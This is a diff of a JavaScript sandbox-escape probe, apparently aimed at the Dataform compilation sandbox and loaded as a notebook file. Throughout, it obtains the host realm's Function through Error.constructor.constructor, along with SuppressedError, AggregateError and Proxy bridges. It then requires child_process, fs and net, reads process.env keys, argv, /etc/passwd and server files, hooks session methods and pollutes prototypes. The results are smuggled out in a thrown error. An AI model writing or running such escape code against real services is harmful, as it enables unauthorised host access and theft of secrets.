@@ -1,238 +1,132 @@
-// FULL SANDBOX ENUMERATION — probe every accessible primitive in bundle realm.
-// Loaded via notebook filename → nativeRequire() to bypass any V8 bridge dep.
+// Focused probe — require.transpiler, host realm require, vm.compileModule, session method closures.
 
 var out = {};
 function safe(k, fn) {
   try {
     var v = fn();
-    out[k] = (typeof v === 'string' ? v : JSON.stringify(v)).substring(0, 800);
+    out[k] = (typeof v === 'string' ? v : JSON.stringify(v)).substring(0, 1200);
   } catch(e) {
-    out[k] = 'ERR:' + (e && e.message ? e.message : String(e)).substring(0, 250);
+    out[k] = 'ERR:' + (e && e.message ? e.message : String(e)).substring(0, 350);
   }
 }
 
-// ============ TIER A: GlobalThis full enumeration including jscomp internals ============
-safe('globalThis_all', function() {
-  var keys = Object.getOwnPropertyNames(globalThis).sort();
-  return keys.join(',').substring(0, 2000);
+// ============ TIER A: require.transpiler deep ============
+safe('A1_transpiler_type', function() { return typeof require.transpiler; });
+safe('A2_transpiler_src', function() { return String(require.transpiler).substring(0, 1000); });
+safe('A3_transpiler_keys', function() { return Object.getOwnPropertyNames(require.transpiler || {}).join(','); });
+safe('A4_transpiler_proto', function() { return Object.getOwnPropertyNames(Object.getPrototypeOf(require.transpiler) || {}).join(','); });
+safe('A5_transpiler_call_simple', function() {
+  try { return String(require.transpiler('return 42')).substring(0, 500); } catch(e) { return 'err:' + e.message; }
 });
-safe('global_jscomp_keys', function() { return Object.keys($jscomp).sort().join(','); });
-safe('global_jscomp_proto', function() { return Object.getOwnPropertyNames(Object.getPrototypeOf($jscomp) || {}).join(','); });
-safe('global_jscomp_str', function() { return String($jscomp).substring(0, 400); });
-
-// Walk classes$jscomp$inline_* — these are webpack internal classes
-safe('class_inline_1_keys', function() { return Object.getOwnPropertyNames(globalThis.classes$jscomp$inline_1 || {}).join(','); });
-safe('class_inline_2_keys', function() { return Object.getOwnPropertyNames(globalThis.classes$jscomp$inline_2 || {}).join(','); });
-safe('class_inline_3_keys', function() { return Object.getOwnPropertyNames(globalThis.classes$jscomp$inline_3 || {}).join(','); });
-safe('class_inline_6_keys', function() { return Object.getOwnPropertyNames(globalThis.classes$jscomp$inline_6 || {}).join(','); });
-safe('class_inline_1_str', function() { return String(globalThis.classes$jscomp$inline_1).substring(0, 500); });
-safe('class_inline_2_str', function() { return String(globalThis.classes$jscomp$inline_2).substring(0, 500); });
-
-// JSCompiler_inline_result$jscomp$* — webpack inline results
-safe('jscomp_inline_result_0', function() { return JSON.stringify(globalThis.JSCompiler_inline_result$jscomp$0 || 'none').substring(0,400); });
-safe('jscomp_inline_result_2', function() { return JSON.stringify(globalThis.JSCompiler_inline_result$jscomp$2 || 'none').substring(0,400); });
-safe('jscomp_inline_result_3', function() { return JSON.stringify(globalThis.JSCompiler_inline_result$jscomp$3 || 'none').substring(0,400); });
-
-// ============ TIER B: restricted_fs FULL surface ============
-safe('rfs_keys', function() { return Object.getOwnPropertyNames(restricted_fs).sort().join(','); });
-safe('rfs_proto_keys', function() { return Object.getOwnPropertyNames(Object.getPrototypeOf(restricted_fs)).sort().join(','); });
-safe('rfs_writeFile_exists', function() { return typeof restricted_fs.writeFile; });
-safe('rfs_readlink_exists', function() { return typeof restricted_fs.readlink; });
-safe('rfs_stat_exists', function() { return typeof restricted_fs.stat; });
-safe('rfs_realpath_exists', function() { return typeof restricted_fs.realpath; });
-safe('rfs_mkdir_exists', function() { return typeof restricted_fs.mkdir; });
-safe('rfs_unlink_exists', function() { return typeof restricted_fs.unlink; });
-safe('rfs_readdir_exists', function() { return typeof restricted_fs.readdir; });
-// Inspect each function
-safe('rfs_readFile_src', function() { return String(restricted_fs.readFile).substring(0, 600); });
-safe('rfs_exists_src', function() { return String(restricted_fs.exists).substring(0, 600); });
-safe('rfs_isDirectory_src', function() { return String(restricted_fs.isDirectory).substring(0, 600); });
-
-// ============ TIER C: bundled vm full surface ============
-safe('vm_keys', function() { return Object.getOwnPropertyNames(vm).sort().join(','); });
-safe('vm_proto_keys', function() { return Object.getOwnPropertyNames(Object.getPrototypeOf(vm)).sort().join(','); });
-safe('vm_runInNewContext_exists', function() { return typeof vm.runInNewContext; });
-safe('vm_Script_exists', function() { return typeof vm.Script; });
-safe('vm_createContext_exists', function() { return typeof vm.createContext; });
-safe('vm_compileFunction_exists', function() { return typeof vm.compileFunction; });
-safe('vm_compileModule_src', function() { return String(vm.compileModule).substring(0, 500); });
-// vm.compileModule looks like it accepts source code — let's try calling it
-safe('vm_compileModule_simple', function() {
-  try {
-    var m = vm.compileModule('return 42');
-    return 'GOT module: ' + typeof m;
-  } catch(e) { return 'compile_err:' + e.message; }
+safe('A6_transpiler_call_eval', function() {
+  try { return String(require.transpiler('process.env')).substring(0, 500); } catch(e) { return 'err:' + e.message; }
 });
-safe('vm_compileModule_process', function() {
-  try {
-    var m = vm.compileModule('return typeof process');
-    return 'GOT module: ' + typeof m + ' = ' + String(m).substring(0,200);
-  } catch(e) { return 'err:' + e.message; }
+safe('A7_transpiler_call_obj', function() {
+  try { return String(require.transpiler({source: 'return 1'})).substring(0, 500); } catch(e) { return 'err:' + e.message; }
 });
 
-// ============ TIER D: bundled require surface ============
-safe('require_keys', function() { return Object.getOwnPropertyNames(require).sort().join(','); });
-safe('require_resolve_exists', function() { return typeof require.resolve; });
-safe('require_cache_exists', function() { return typeof require.cache + ',keys=' + (require.cache ? Object.keys(require.cache).length : 'none'); });
-safe('require_extensions_exists', function() { return typeof require.extensions; });
-safe('require_main_exists', function() { return typeof require.main; });
-safe('require_resolve_path', function() {
-  try { return require.resolve('path'); } catch(e) { return 'err:' + e.message; }
+// ============ TIER B: require as constructor / function ============
+safe('B1_require_src', function() { return String(require).substring(0, 800); });
+safe('B2_require_prototype', function() { return Object.getOwnPropertyNames(require.prototype || {}).join(','); });
+safe('B3_new_require', function() {
+  try { var r = new require(); return 'made ' + typeof r + ' keys:' + Object.getOwnPropertyNames(r).join(','); } catch(e) { return 'err:' + e.message; }
 });
-
-// ============ TIER E: modern V8 escape primitives ============
-// SuppressedError (ES2023) — vm2 CVE-2026-26332 family
-safe('SuppressedError_exists', function() { return typeof SuppressedError; });
-safe('AggregateError_exists', function() { return typeof AggregateError; });
-safe('SuppressedError_bridge', function() {
-  try {
-    var s = new SuppressedError(new Error('inner'), new Error('outer'), 'msg');
-    var F = s.constructor.constructor;
-    return F('return typeof process')();
-  } catch(e) { return 'err:' + e.message; }
-});
-safe('AggregateError_bridge', function() {
-  try {
-    var ag = new AggregateError([new Error('a')], 'msg');
-    var F = ag.errors[0].constructor.constructor;
-    return F('return typeof process')();
-  } catch(e) { return 'err:' + e.message; }
-});
-
-// Async function constructor — different from Function
-safe('AsyncFunction', function() {
-  var AsyncF = (async function() {}).constructor;
-  return typeof AsyncF + ' src:' + String(AsyncF).substring(0,200);
-});
-safe('AsyncFunction_call', function() {
-  var AsyncF = (async function() {}).constructor;
-  var fn = AsyncF('return typeof process');
-  return 'made async fn, type=' + typeof fn;
-});
-
-// Generator function constructor
-safe('GeneratorFunction', function() {
-  var GenF = (function*() {}).constructor;
-  return typeof GenF + ' src:' + String(GenF).substring(0,200);
-});
-
-// ============ TIER F: _DF_SESSION methods that might bridge realms ============
-safe('session_compile_src', function() {
-  return String(global._DF_SESSION.compile).substring(0, 800);
-});
-safe('session_compileToBase64_src', function() {
-  return String(global._DF_SESSION.compileToBase64).substring(0, 800);
-});
-safe('session_compileError_src', function() {
-  return String(global._DF_SESSION.compileError).substring(0, 800);
-});
-// What does compileError return? If user-controllable, we control error response
-safe('session_compileError_call', function() {
-  try {
-    return String(global._DF_SESSION.compileError(new Error('test'), 'definitions/x.sqlx'));
-  } catch(e) { return 'err:' + e.message; }
-});
-
-// ============ TIER G: Reflect / Proxy primitives ============
-safe('Reflect_keys', function() { return Object.getOwnPropertyNames(Reflect).sort().join(','); });
-safe('Proxy_exists', function() { return typeof Proxy; });
-
-// Proxy trap that triggers when bundled code accesses our object
-safe('proxy_get_trap', function() {
-  var p = new Proxy({}, {
-    get: function(target, prop) {
-      try {
-        // Inside trap, can we access caller's stack?
-        var e = new Error('trap');
-        return e.constructor.constructor('return typeof process')();
-      } catch(e) { return 'trap_err:' + e.message; }
-    }
-  });
-  return 'proxy made, access x: ' + p.x;
-});
-
-// ============ TIER H: Native function detection ============
-safe('find_native_functions', function() {
-  var found = [];
-  function walk(obj, path, depth) {
-    if (depth > 2) return;
-    if (!obj || typeof obj !== 'object' && typeof obj !== 'function') return;
+safe('B4_require_call_various', function() {
+  var paths = ['fs', 'child_process', 'net', 'path', '/etc/passwd', './bundle.js', '@dataform/core', 'crypto', 'http', 'https'];
+  var results = {};
+  for (var i = 0; i < paths.length; i++) {
     try {
-      var keys = Object.getOwnPropertyNames(obj);
-      for (var i = 0; i < keys.length && found.length < 30; i++) {
-        var k = keys[i];
-        try {
-          var v = obj[k];
-          if (typeof v === 'function') {
-            var src = String(v);
-            if (src.indexOf('[native code]') >= 0) {
-              found.push(path + '.' + k);
-            }
-          }
-        } catch(e) {}
-      }
-    } catch(e) {}
+      var r = require(paths[i]);
+      results[paths[i]] = 'GOT typeof=' + typeof r + ' keys=' + (typeof r === 'object' ? Object.keys(r || {}).slice(0,10).join(',') : '');
+    } catch(e) { results[paths[i]] = 'err:' + e.message.substring(0,80); }
   }
-  walk(globalThis, 'g', 0);
-  walk(restricted_fs, 'rfs', 0);
-  walk(global._DF_SESSION, 'sess', 0);
-  walk(vm, 'vm', 0);
-  walk(require, 'req', 0);
-  return found.join(',');
+  return JSON.stringify(results);
 });
 
-// ============ TIER I: Prototype pollution effects ============
-// Modify Array.prototype.push — does Dataform use it internally?
-safe('array_push_polluted', function() {
-  var orig = Array.prototype.push;
-  var hit = [];
-  Array.prototype.push = function() {
-    try { hit.push(String(new Error().stack).substring(0,200)); } catch(e) {}
-    return orig.apply(this, arguments);
+// ============ TIER C: HOST realm require deep probe ============
+safe('C1_host_realm_require', function() {
+  function herr() { try { JSON.parse('{'); } catch(e) { return e; } }
+  var F = herr().constructor.constructor;
+  return F('var probes = ["fs","child_process","net","path","crypto","http","https","os","child_process","tty","stream","url","util","vm","events","buffer","timers","module","process","Buffer","global"]; var r = {}; for (var p of probes) { try { var m = require(p); r[p] = "GOT keys:" + Object.keys(m||{}).slice(0,12).join(","); } catch(e) { r[p] = "err:" + e.message.substring(0,60); } } return JSON.stringify(r);')();
+});
+
+safe('C2_host_realm_globalThis_full', function() {
+  function herr() { try { JSON.parse('{'); } catch(e) { return e; } }
+  var F = herr().constructor.constructor;
+  return F('return Object.getOwnPropertyNames(globalThis).sort().join(",")')();
+});
+
+safe('C3_host_eval_process_props', function() {
+  function herr() { try { JSON.parse('{'); } catch(e) { return e; } }
+  var F = herr().constructor.constructor;
+  return F('try { return JSON.stringify({argv: process.argv, env_keys: Object.keys(process.env).slice(0,50), execPath: process.execPath, versions: process.versions, pid: process.pid}); } catch(e) { return "err:" + e.message; }')();
+});
+
+safe('C4_host_realm_dirname', function() {
+  function herr() { try { JSON.parse('{'); } catch(e) { return e; } }
+  var F = herr().constructor.constructor;
+  return F('return typeof __dirname + "=" + (typeof __dirname !== "undefined" ? __dirname : "n/a") + " | filename:" + (typeof __filename !== "undefined" ? __filename : "n/a")')();
+});
+
+// ============ TIER D: vm.compileModule formats ============
+safe('D1_vm_compileModule_obj', function() {
+  try { var m = vm.compileModule({source: 'return 1'}); return 'obj_arg: ' + typeof m; } catch(e) { return 'err:' + e.message; }
+});
+safe('D2_vm_compileModule_with_id', function() {
+  try { var m = vm.compileModule('return 1', 'test_module'); return 'with_id: ' + typeof m; } catch(e) { return 'err:' + e.message; }
+});
+safe('D3_vm_compileModule_factory', function() {
+  try {
+    var m = vm.compileModule('module.exports = function() { return typeof process; }');
+    if (typeof m === 'function') { return 'func: ' + m(); }
+    if (typeof m === 'object' && m) {
+      var keys = Object.getOwnPropertyNames(m).join(',');
+      var execResult = 'no_exec';
+      try { execResult = String(m.exports || m.default || m); } catch(e) {}
+      return 'obj keys:' + keys + ' exec:' + execResult.substring(0,200);
+    }
+    return 'other: ' + typeof m;
+  } catch(e) { return 'err:' + e.message; }
+});
+
+// ============ TIER E: session.compile closures via toString ============
+safe('E1_session_compile_full_src', function() { return String(global._DF_SESSION.compile).substring(0, 3000); });
+safe('E2_session_sqlxAction_src', function() { return String(global._DF_SESSION.sqlxAction).substring(0, 2500); });
+safe('E3_session_compileGraphChunk_src', function() { return String(global._DF_SESSION.compileGraphChunk).substring(0, 2500); });
+safe('E4_session_resolve_src', function() { return String(global._DF_SESSION.resolve).substring(0, 2000); });
+
+// ============ TIER F: Hook session.sqlxAction to intercept ============
+safe('F1_sqlxAction_intercept', function() {
+  var s = global._DF_SESSION;
+  if (typeof s.sqlxAction !== 'function') return 'no_sqlxAction';
+  var origSqlx = s.sqlxAction.bind(s);
+  s.sqlxAction = function() {
+    try {
+      out.F1a_sqlx_called_with = JSON.stringify(Array.from(arguments).map(function(a) { return typeof a; })).substring(0,300);
+      if (arguments[0] && typeof arguments[0] === 'object') {
+        out.F1b_sqlx_arg_keys = Object.keys(arguments[0]).join(',');
+      }
+    } catch(e) { out.F1_err = e.message; }
+    return origSqlx.apply(this, arguments);
   };
-  // restore promptly to avoid breaking subsequent ops
-  setTimeout(function() { Array.prototype.push = orig; }, 0);
-  return 'polluted, hits: ' + hit.length;
+  return 'hooked';
 });
 
-// ============ TIER J: bundle realm Function vs sandbox realm ============
-// The realm-bridge primitive we already know works
-safe('classic_bridge_via_TypeError', function() {
-  function herr() { try { null.x; } catch(e) { return e; } }
-  var F = herr().constructor.constructor;
-  return F('return typeof process + "|" + typeof Buffer + "|" + typeof require + "|" + typeof __dirname')();
-});
+// ============ TIER G: dataform / publish / operate / assert globals deep ============
+safe('G1_dataform_global', function() { return typeof dataform + ' keys:' + Object.getOwnPropertyNames(dataform || {}).join(','); });
+safe('G2_publish_src', function() { return String(globalThis.publish).substring(0, 600); });
+safe('G3_operate_src', function() { return String(globalThis.operate).substring(0, 600); });
+safe('G4_declare_src', function() { return String(globalThis.declare).substring(0, 600); });
 
-// What if we bridge through error from VARIOUS native operations
-safe('bridge_RangeError', function() {
-  function herr() { try { (new Array(-1)); } catch(e) { return e; } }
-  var F = herr().constructor.constructor;
-  return F('return typeof process')();
-});
-safe('bridge_ReferenceError', function() {
-  function herr() { try { undefinedVarXYZ; } catch(e) { return e; } }
-  var F = herr().constructor.constructor;
-  return F('return typeof process')();
-});
-safe('bridge_URIError', function() {
-  function herr() { try { decodeURIComponent('%'); } catch(e) { return e; } }
-  var F = herr().constructor.constructor;
-  return F('return typeof process')();
-});
+// ============ TIER H: core global ============
+safe('H1_core_keys', function() { return Object.getOwnPropertyNames(core || {}).join(','); });
+safe('H2_core_proto', function() { return Object.getOwnPropertyNames(Object.getPrototypeOf(core) || {}).join(','); });
+safe('H3_core_str', function() { return String(core).substring(0, 500); });
 
-// ============ TIER K: __dirname / __filename leak server-side paths ============
-safe('dirname_val', function() { return __dirname; });
-safe('filename_val', function() { return __filename; });
+// ============ TIER I: mainWithVersionCheck — was in globalThis ============
+safe('I1_mainWithVersionCheck_src', function() { return String(globalThis.mainWithVersionCheck).substring(0, 1000); });
 
-// Try reading paths near __dirname via restricted_fs
-safe('rfs_dirname', function() {
-  try { return restricted_fs.readFile(__dirname + '/package.json').toString().substring(0, 500); } catch(e) { return 'err:' + e.message; }
-});
-safe('rfs_dirname_index', function() {
-  try { return restricted_fs.readFile('index.js').toString().substring(0, 500); } catch(e) { return 'err:' + e.message; }
-});
-
-// ============ Provide notebook shape ============
+// Provide notebook shape
 module.exports.asJson = { cells: [], metadata: {}, nbformat: 4, nbformat_minor: 5 };
 
-throw new Error('FULL_SANDBOX_PROBE:' + JSON.stringify(out));
+throw new Error('FULL_v2_PROBE:' + JSON.stringify(out));
